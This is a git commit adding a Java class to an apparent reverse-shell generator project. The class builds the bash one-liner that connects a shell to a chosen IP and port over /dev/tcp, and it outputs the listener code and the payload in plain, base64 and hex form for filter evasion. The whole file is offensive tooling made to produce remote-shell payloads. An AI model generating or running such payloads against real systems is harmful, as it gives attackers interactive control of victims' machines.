fcf33d54b56ab78051a374503474edfc76750b54
Missael Cortes <60858064+missaelcorm@users.noreply.github.com>
2023-07-02 00:10:13 -0600

    Create Bash_i.java

---
+++ src/com/iteso/ReverseShellGenerator/Reverse/Shells/Bash_i.java
@@ -0,0 +1,28 @@
+package com.iteso.ReverseShellGenerator.Reverse.Shells;
+
+import com.iteso.ReverseShellGenerator.DEncoder;
+import com.iteso.ReverseShellGenerator.Reverse.Reverse;
+
+public class Bash_i extends Reverse{
+    protected String shellFormat = "";
+
+    public Bash_i(String localIP, int localPort, LISTENER listener, SHELLS shellType){
+        super(localIP, localPort, listener, shellType);
+        shellFormat = String.format("%s -i >& /dev/tcp/%s/%s 0>&1", this.getShell(), this.getLocalIP(), this.getLocalPort());
+    }
+
+    @Override
+    public String getShellCode(){
+        return shellFormat;
+    }
+
+    @Override
+    public String toString(){
+        return "{" + "\"parameters\": " + super.toString() + "," +
+                    "\"reverse_listener_code\": " + "\"" + super.getListenerCode() + "\"," +
+                    "\"reverse_shell_code\": " + "\"" + getShellCode() + "\"," +
+                    "\"reverse_shell_code_b64\": " + "\"" + DEncoder.encodeToBase64(getShellCode()) + "\"," +
+                    "\"reverse_shell_code_hex\": " + "\"" + DEncoder.encodeToHex(getShellCode()) + "\"" +
+                "}";
+    }
+}
